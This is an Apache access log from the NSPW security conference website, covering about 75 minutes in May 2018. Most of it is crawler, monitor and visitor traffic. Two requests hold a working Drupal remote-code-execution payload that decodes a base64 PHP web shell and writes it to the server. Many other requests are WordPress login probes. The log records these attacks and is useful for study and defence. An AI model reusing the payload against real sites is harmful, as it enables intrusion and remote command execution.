216.244.66.200 - - [01/May/2018:17:28:57 -0400] "GET /robots.txt HTTP/1.1" 200 5796 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
137.112.228.195 - - [01/May/2018:17:29:11 -0400] "GET /papers/2007/nspw2007-mannan.pdf HTTP/1.1" 200 502385 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_5 like Mac OS X) AppleWebKit/604.5.6 (KHTML, like Gecko) Version/11.0 Mobile/15D60 Safari/604.1"
137.112.228.195 - - [01/May/2018:17:29:11 -0400] "GET /apple-touch-icon-120x120-precomposed.png HTTP/1.1" 404 3943 "-" "MobileSafari/604.1 CFNetwork/894 Darwin/17.4.0"
137.112.228.195 - - [01/May/2018:17:29:11 -0400] "GET /apple-touch-icon-120x120.png HTTP/1.1" 404 717 "-" "MobileSafari/604.1 CFNetwork/894 Darwin/17.4.0"
137.112.228.195 - - [01/May/2018:17:29:12 -0400] "GET /apple-touch-icon-precomposed.png HTTP/1.1" 404 721 "-" "MobileSafari/604.1 CFNetwork/894 Darwin/17.4.0"
137.112.228.195 - - [01/May/2018:17:29:12 -0400] "GET /apple-touch-icon.png HTTP/1.1" 404 709 "-" "MobileSafari/604.1 CFNetwork/894 Darwin/17.4.0"
137.112.228.195 - - [01/May/2018:17:29:12 -0400] "GET /favicon.ico HTTP/1.1" 404 700 "-" "MobileSafari/604.1 CFNetwork/894 Darwin/17.4.0"
137.112.228.195 - - [01/May/2018:17:29:12 -0400] "GET /apple-touch-icon-120x120-precomposed.png HTTP/1.1" 404 729 "-" "MobileSafari/604.1 CFNetwork/894 Darwin/17.4.0"
137.112.228.195 - - [01/May/2018:17:29:12 -0400] "GET /apple-touch-icon-120x120.png HTTP/1.1" 404 717 "-" "MobileSafari/604.1 CFNetwork/894 Darwin/17.4.0"
137.112.228.195 - - [01/May/2018:17:29:12 -0400] "GET /apple-touch-icon-precomposed.png HTTP/1.1" 404 721 "-" "MobileSafari/604.1 CFNetwork/894 Darwin/17.4.0"
137.112.228.195 - - [01/May/2018:17:29:12 -0400] "GET /apple-touch-icon.png HTTP/1.1" 404 709 "-" "MobileSafari/604.1 CFNetwork/894 Darwin/17.4.0"
137.112.228.195 - - [01/May/2018:17:29:12 -0400] "GET /favicon.ico HTTP/1.1" 404 700 "-" "MobileSafari/604.1 CFNetwork/894 Darwin/17.4.0"
69.162.124.227 - - [01/May/2018:17:30:34 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
154.69.201.74 - - [01/May/2018:17:31:25 -0400] "GET /wp-login.php HTTP/1.1" 404 7903 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
154.69.201.74 - - [01/May/2018:17:31:25 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
203.133.169.137 - - [01/May/2018:17:32:43 -0400] "GET /robots.txt HTTP/1.1" 200 5853 "-" "Mozilla/5.0 (compatible; Daum/4.1; +http://cs.daum.net/faq/15/4118.html?faqId=28966)"
203.133.169.137 - - [01/May/2018:17:32:49 -0400] "GET /robots.txt HTTP/1.1" 200 5853 "-" "Mozilla/5.0 (compatible; Daum/4.1; +http://cs.daum.net/faq/15/4118.html?faqId=28966)"
203.133.169.137 - - [01/May/2018:17:32:50 -0400] "GET /proceedings HTTP/1.1" 200 13271 "-" "Mozilla/5.0 (compatible; Daum/4.1; +http://cs.daum.net/faq/15/4118.html?faqId=28966)"
216.244.66.236 - - [01/May/2018:17:33:03 -0400] "GET /robots.txt HTTP/1.1" 200 5796 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
203.133.169.137 - - [01/May/2018:17:33:12 -0400] "GET / HTTP/1.1" 200 11501 "-" "Mozilla/5.0 (compatible; Daum/4.1; +http://cs.daum.net/faq/15/4118.html?faqId=28966)"
66.249.73.87 - - [01/May/2018:17:34:32 -0400] "GET /2008/cfp.shtml HTTP/1.1" 200 8646 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
77.88.47.40 - - [01/May/2018:17:34:34 -0400] "GET /papers/2001/nspw2001-du.pdf HTTP/1.1" 200 914456 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
77.88.47.40 - - [01/May/2018:17:35:26 -0400] "GET /user HTTP/1.1" 200 2655 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
77.88.47.40 - - [01/May/2018:17:35:29 -0400] "GET /papers/1999/?C=M;O=A HTTP/1.1" 200 967 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
69.162.124.227 - - [01/May/2018:17:35:34 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
186.136.248.8 - - [01/May/2018:17:38:56 -0400] "GET /wp-login.php HTTP/1.1" 404 7839 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
186.136.248.8 - - [01/May/2018:17:38:57 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
69.162.124.227 - - [01/May/2018:17:40:34 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
66.249.73.91 - - [01/May/2018:17:42:54 -0400] "GET /2005/pc.content HTTP/1.1" 200 5856 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
165.117.232.83 - - [01/May/2018:17:43:35 -0400] "GET /papers/2007/nspw2007-edwards.pdf HTTP/1.1" 200 345375 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.149 Safari/537.36"
199.59.150.183 - - [01/May/2018:17:43:56 -0400] "GET /robots.txt HTTP/1.1" 200 5699 "-" "Twitterbot/1.0"
69.162.124.227 - - [01/May/2018:17:45:34 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
77.88.47.40 - - [01/May/2018:17:46:38 -0400] "GET /proceedings/2000 HTTP/1.1" 200 6155 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
77.88.47.40 - - [01/May/2018:17:47:10 -0400] "GET /papers/2013/nspw2013-ashenden.pdf HTTP/1.1" 200 684791 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
185.244.25.162 - - [01/May/2018:17:48:03 -0400] "GET /?q=user/password&name[%23post_render][]=passthru&name[%23type]=markup&name[%23markup]=echo%20PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9%20%7C%20base64%20-d%20%7C%20tee%20owotg.php HTTP/1.1" 200 6282 "-" "curl/7.19.7"
185.244.25.162 - - [01/May/2018:17:48:04 -0400] "GET /?q=user/password&name[%23post_render][]=passthru&name[%23type]=markup&name[%23markup]=echo%20PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9%20%7C%20base64%20-d%20%7C%20tee%20owotg.php HTTP/1.1" 200 6283 "-" "curl/7.19.7"
77.88.47.40 - - [01/May/2018:17:48:04 -0400] "GET /node/75 HTTP/1.1" 200 6450 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
123.125.71.106 - - [01/May/2018:17:48:35 -0400] "GET /current/cfp/flyer_NSPW_2013.pdf HTTP/1.1" 404 8026 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
203.177.135.138 - - [01/May/2018:17:49:52 -0400] "GET /wp-login.php HTTP/1.1" 404 7491 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
203.177.135.138 - - [01/May/2018:17:49:53 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
69.162.124.227 - - [01/May/2018:17:50:34 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
66.249.73.91 - - [01/May/2018:17:51:16 -0400] "GET /2005/dates.content HTTP/1.1" 200 4297 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
146.95.192.179 - - [01/May/2018:17:52:34 -0400] "GET /papers/2011/nspw2011-feigenbaum.pdf HTTP/1.1" 200 601773 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0"
146.95.192.179 - - [01/May/2018:17:52:34 -0400] "GET /favicon.ico HTTP/1.1" 404 700 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0"
146.95.192.179 - - [01/May/2018:17:52:34 -0400] "GET /papers/2011/nspw2011-feigenbaum.pdf HTTP/1.1" 206 66025 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0"
146.95.192.179 - - [01/May/2018:17:52:34 -0400] "GET /papers/2011/nspw2011-feigenbaum.pdf HTTP/1.1" 206 7707 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0"
95.120.22.254 - - [01/May/2018:17:54:14 -0400] "GET /wp-login.php HTTP/1.1" 404 7839 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
95.120.22.254 - - [01/May/2018:17:54:16 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
69.162.124.227 - - [01/May/2018:17:55:34 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
92.167.85.217 - - [01/May/2018:17:56:56 -0400] "GET /wp-login.php HTTP/1.1" 404 7839 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
92.167.85.217 - - [01/May/2018:17:56:57 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
66.249.73.89 - - [01/May/2018:17:59:39 -0400] "GET /papers/2005/nspw2005-backmatter.pdf HTTP/1.1" 200 108422 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
69.162.124.227 - - [01/May/2018:18:00:34 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
77.88.47.40 - - [01/May/2018:18:04:33 -0400] "GET /2009/proceedings/2006/?C=S;O=A HTTP/1.1" 200 4323 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
77.88.47.40 - - [01/May/2018:18:04:36 -0400] "GET /papers/2013/?C=M;O=D HTTP/1.1" 200 960 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
69.162.124.227 - - [01/May/2018:18:05:34 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
77.88.47.40 - - [01/May/2018:18:05:28 -0400] "GET /2009/proceedings/1994/nspw1994-schneier.pdf HTTP/1.1" 200 336815 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
66.249.73.89 - - [01/May/2018:18:08:03 -0400] "GET /2017/dates HTTP/1.1" 200 6442 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
69.162.124.227 - - [01/May/2018:18:10:34 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
41.109.247.86 - - [01/May/2018:18:11:00 -0400] "GET /wp-login.php HTTP/1.1" 404 7484 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
41.109.247.86 - - [01/May/2018:18:11:01 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
37.214.176.217 - - [01/May/2018:18:11:30 -0400] "GET / HTTP/1.0" 200 11576 "https://www.nspw.org/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.89 Safari/537.36 OPR/49.0.2725.47 (Edition Yx)"
199.16.157.183 - - [01/May/2018:18:14:02 -0400] "GET /robots.txt HTTP/1.1" 200 5699 "-" "Twitterbot/1.0"
199.19.248.219 - - [01/May/2018:18:14:07 -0400] "GET /favicon.ico HTTP/1.1" 404 3928 "https://www.nspw.org/papers/2013/nspw2013-ard.pdf" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36"
199.19.248.219 - - [01/May/2018:18:14:06 -0400] "GET /papers/2013/nspw2013-ard.pdf HTTP/1.1" 200 740363 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36"
69.162.124.227 - - [01/May/2018:18:15:34 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
185.200.214.31 - - [01/May/2018:18:15:41 -0400] "GET /wp-login.php HTTP/1.1" 404 7839 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
185.200.214.31 - - [01/May/2018:18:15:41 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
66.249.73.89 - - [01/May/2018:18:16:24 -0400] "GET /papers/2008/nspw2008-beautement.pdf HTTP/1.1" 304 3605 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
81.109.41.75 - - [01/May/2018:18:18:27 -0400] "GET /wp-login.php HTTP/1.1" 404 8180 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
81.109.41.75 - - [01/May/2018:18:18:27 -0400] "GET / HTTP/1.1" 200 8298 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
131.107.174.143 - - [01/May/2018:18:20:15 -0400] "GET /2018/organizers HTTP/1.1" 200 6974 "https://t.co/gWNBXtdVTl" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 Edge/16.16299"
131.107.174.143 - - [01/May/2018:18:20:15 -0400] "GET /modules/system/system.menus.css?p7r9uw HTTP/1.1" 200 1025 "https://www.nspw.org/2018/organizers" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 Edge/16.16299"
131.107.174.143 - - [01/May/2018:18:20:15 -0400] "GET /modules/system/system.base.css?p7r9uw HTTP/1.1" 200 5716 "https://www.nspw.org/2018/organizers" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 Edge/16.16299"
131.107.174.143 - - [01/May/2018:18:20:15 -0400] "GET /modules/system/system.messages.css?p7r9uw HTTP/1.1" 200 746 "https://www.nspw.org/2018/organizers" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 Edge/16.16299"
131.107.174.143 - - [01/May/2018:18:20:15 -0400] "GET /modules/system/system.theme.css?p7r9uw HTTP/1.1" 200 1585 "https://www.nspw.org/2018/organizers" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 Edge/16.16299"
131.107.174.143 - - [01/May/2018:18:20:15 -0400] "GET /modules/comment/comment.css?p7r9uw HTTP/1.1" 200 505 "https://www.nspw.org/2018/organizers" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 Edge/16.16299"
131.107.174.143 - - [01/May/2018:18:20:15 -0400] "GET /modules/node/node.css?p7r9uw HTTP/1.1" 200 597 "https://www.nspw.org/2018/organizers" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 Edge/16.16299"
131.107.174.143 - - [01/May/2018:18:20:15 -0400] "GET /modules/field/theme/field.css?p7r9uw HTTP/1.1" 200 724 "https://www.nspw.org/2018/organizers" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 Edge/16.16299"
131.107.174.143 - - [01/May/2018:18:20:15 -0400] "GET /modules/user/user.css?p7r9uw HTTP/1.1" 200 1062 "https://www.nspw.org/2018/organizers" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 Edge/16.16299"
131.107.174.143 - - [01/May/2018:18:20:15 -0400] "GET /themes/garland/print.css?p7r9uw HTTP/1.1" 200 896 "https://www.nspw.org/2018/organizers" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 Edge/16.16299"
131.107.174.143 - - [01/May/2018:18:20:15 -0400] "GET /themes/garland/style.css?p7r9uw HTTP/1.1" 200 5495 "https://www.nspw.org/2018/organizers" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 Edge/16.16299"
131.107.174.143 - - [01/May/2018:18:20:15 -0400] "GET /misc/jquery.js?v=1.4.4 HTTP/1.1" 200 27601 "https://www.nspw.org/2018/organizers" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 Edge/16.16299"
131.107.174.143 - - [01/May/2018:18:20:15 -0400] "GET /misc/jquery.once.js?v=1.2 HTTP/1.1" 200 1445 "https://www.nspw.org/2018/organizers" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 Edge/16.16299"
131.107.174.143 - - [01/May/2018:18:20:15 -0400] "GET /misc/drupal.js?p7r9uw HTTP/1.1" 200 7372 "https://www.nspw.org/2018/organizers" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 Edge/16.16299"
131.107.174.143 - - [01/May/2018:18:20:16 -0400] "GET /sites/default/files/nspw-logo-smaller.jpg HTTP/1.1" 200 2534 "https://www.nspw.org/2018/organizers" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 Edge/16.16299"
131.107.174.143 - - [01/May/2018:18:20:16 -0400] "GET /themes/garland/images/bg-navigation-item.png HTTP/1.1" 200 812 "https://www.nspw.org/2018/organizers" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 Edge/16.16299"
131.107.174.143 - - [01/May/2018:18:20:16 -0400] "GET /themes/garland/images/menu-expanded.gif HTTP/1.1" 200 495 "https://www.nspw.org/2018/organizers" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 Edge/16.16299"
131.107.174.143 - - [01/May/2018:18:20:16 -0400] "GET /themes/garland/images/bg-content.png HTTP/1.1" 200 798 "https://www.nspw.org/2018/organizers" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 Edge/16.16299"
131.107.174.143 - - [01/May/2018:18:20:16 -0400] "GET /themes/garland/images/body.png HTTP/1.1" 200 993 "https://www.nspw.org/2018/organizers" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 Edge/16.16299"
131.107.174.143 - - [01/May/2018:18:20:16 -0400] "GET /themes/garland/images/menu-leaf.gif HTTP/1.1" 200 486 "https://www.nspw.org/2018/organizers" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 Edge/16.16299"
131.107.174.143 - - [01/May/2018:18:20:16 -0400] "GET /themes/garland/images/menu-collapsed.gif HTTP/1.1" 200 488 "https://www.nspw.org/2018/organizers" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 Edge/16.16299"
131.107.174.143 - - [01/May/2018:18:20:16 -0400] "GET /themes/garland/images/bg-content-right.png HTTP/1.1" 200 3162 "https://www.nspw.org/2018/organizers" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 Edge/16.16299"
131.107.174.143 - - [01/May/2018:18:20:16 -0400] "GET /themes/garland/images/bg-content-left.png HTTP/1.1" 200 3232 "https://www.nspw.org/2018/organizers" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 Edge/16.16299"
131.107.174.143 - - [01/May/2018:18:20:16 -0400] "GET /favicon.ico HTTP/1.1" 404 4109 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 Edge/16.16299"
69.162.124.227 - - [01/May/2018:18:20:34 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
131.107.174.143 - - [01/May/2018:18:20:36 -0400] "-" 408 3408 "-" "-"
77.88.47.40 - - [01/May/2018:18:21:52 -0400] "GET /papers/2001/nspw2001-zhang.pdf HTTP/1.1" 200 605302 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
138.197.72.0 - - [01/May/2018:18:23:49 -0400] "GET /robots.txt HTTP/1.1" 200 4264 "http://nspw.org/robots.txt" "Go-http-client/1.1"
138.197.72.0 - - [01/May/2018:18:23:49 -0400] "GET /2003/oldindex.html HTTP/1.1" 200 1722 "http://nspw.org/2003/oldindex.html" "VelenPublicWebCrawler (velen.io)"
66.249.73.89 - - [01/May/2018:18:24:46 -0400] "GET / HTTP/1.1" 200 6607 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
69.162.124.227 - - [01/May/2018:18:25:34 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
69.162.124.227 - - [01/May/2018:18:30:34 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
77.88.47.40 - - [01/May/2018:18:32:30 -0400] "GET /2009/proceedings/1999/nspw1999-markham.pdf HTTP/1.1" 200 447590 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
69.162.124.227 - - [01/May/2018:18:35:34 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
77.88.47.40 - - [01/May/2018:18:37:16 -0400] "GET /papers/2001/nspw2001-greenwald.pdf HTTP/1.1" 200 400892 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
77.88.47.40 - - [01/May/2018:18:37:37 -0400] "GET /2017/dates HTTP/1.1" 200 3048 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
66.249.73.87 - - [01/May/2018:18:37:37 -0400] "GET /2006/invite/papers.html HTTP/1.1" 200 4324 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
138.36.227.6 - - [01/May/2018:18:37:55 -0400] "GET /wp-login.php HTTP/1.1" 404 7484 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
138.36.227.6 - - [01/May/2018:18:37:56 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
69.162.124.227 - - [01/May/2018:18:40:34 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
189.190.56.149 - - [01/May/2018:18:40:36 -0400] "GET /wp-login.php HTTP/1.1" 404 7839 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
189.190.56.149 - - [01/May/2018:18:40:37 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
46.62.89.230 - - [01/May/2018:18:40:54 -0400] "GET /wp-login.php HTTP/1.1" 404 8180 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
46.62.89.230 - - [01/May/2018:18:40:54 -0400] "GET / HTTP/1.1" 200 8298 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
191.187.211.164 - - [01/May/2018:18:42:13 -0400] "GET /wp-login.php HTTP/1.1" 404 7839 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
191.187.211.164 - - [01/May/2018:18:42:13 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
131.107.174.143 - - [01/May/2018:18:43:57 -0400] "GET /themes/garland/images/bg-navigation-item-hover.png HTTP/1.1" 200 4163 "https://www.nspw.org/2018/organizers" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 Edge/16.16299"
131.107.174.143 - - [01/May/2018:18:44:17 -0400] "-" 408 3408 "-" "-"
131.107.174.143 - - [01/May/2018:18:44:41 -0400] "GET /2018 HTTP/1.1" 200 3636 "https://www.nspw.org/2018/organizers" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 Edge/16.16299"
131.107.174.143 - - [01/May/2018:18:44:41 -0400] "GET /favicon.ico HTTP/1.1" 404 4109 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 Edge/16.16299"
